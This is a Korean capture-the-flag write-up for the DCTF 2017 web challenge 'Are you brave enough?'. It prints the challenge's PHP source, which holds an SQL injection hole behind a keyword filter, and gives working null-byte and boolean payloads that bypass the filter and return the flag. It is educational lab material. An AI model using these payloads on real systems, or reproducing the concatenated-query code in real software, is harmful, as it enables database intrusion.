# [WEB] DCTF 2017 - Are you brave enough?

# Description
You have a simple challenge, proove your web skills and get the flag. Website

> Update 10:00 EEST: Check index.php~.

# Analysis

문제 페이지(https://brave.dctf-quals-17.def.camp/)에 접속하면 Nop.이란 단어만 출력될 뿐 아무 반응도 없다.
index.php~를 요청하면 백업 파일을 통해 원본 소스를 얻을 수 있다.
```php
<?php

$db  = mysqli_connect('localhost','web_brave','','web_brave');

$id  = @$_GET['id'];
$key = $db->real_escape_string(@$_GET['key']);

if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected

$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";
$q = $db->query($query);

if($q->num_rows) {
    echo '<h3>Users:</h3><ul>';
    while($row = $q->fetch_array()) {
        echo '<li>'.$row['name'].'</li>';
    }

    echo '</ul>';
} else {    
    die('<h3>Nop.</h3>');
}
```
단순한 SQLi문제로써, 다양한 필터링이 걸려있다.
필터링만 우회해 주면 쉽게 해결될 것 같다.

# Exploit
1. SQLi

## SQLi
우선 id의 경우 Integer형태로 받는데 숫자가 필터링 되어있으며, id에 맞는 key또한 필요하고 #나 --와 같은 주석이 필터링 되어있다.
where절의 and 뒷부분을 제거하기 위해 id의 마지막에 ;%00을 삽입하면 되고 숫자가 필터링이 되어있으나 true나 false는 사용할 수 있으므로 이를 이용하도록 하자.
id에 1을 넣어 서버에 요청하면 다음과 같다.
`https://brave.dctf-quals-17.def.camp/index.php?id=true;%00`
```
Users:
    Try Harder
```

id에 2를 넣어 서버에 요청하면 다음과 같다.
`https://brave.dctf-quals-17.def.camp/index.php?id=true%2btrue;%00`
```
Users:
    DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}
```
2를 요청했을 때, FLAG을 얻을 수 있다.

**DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}**
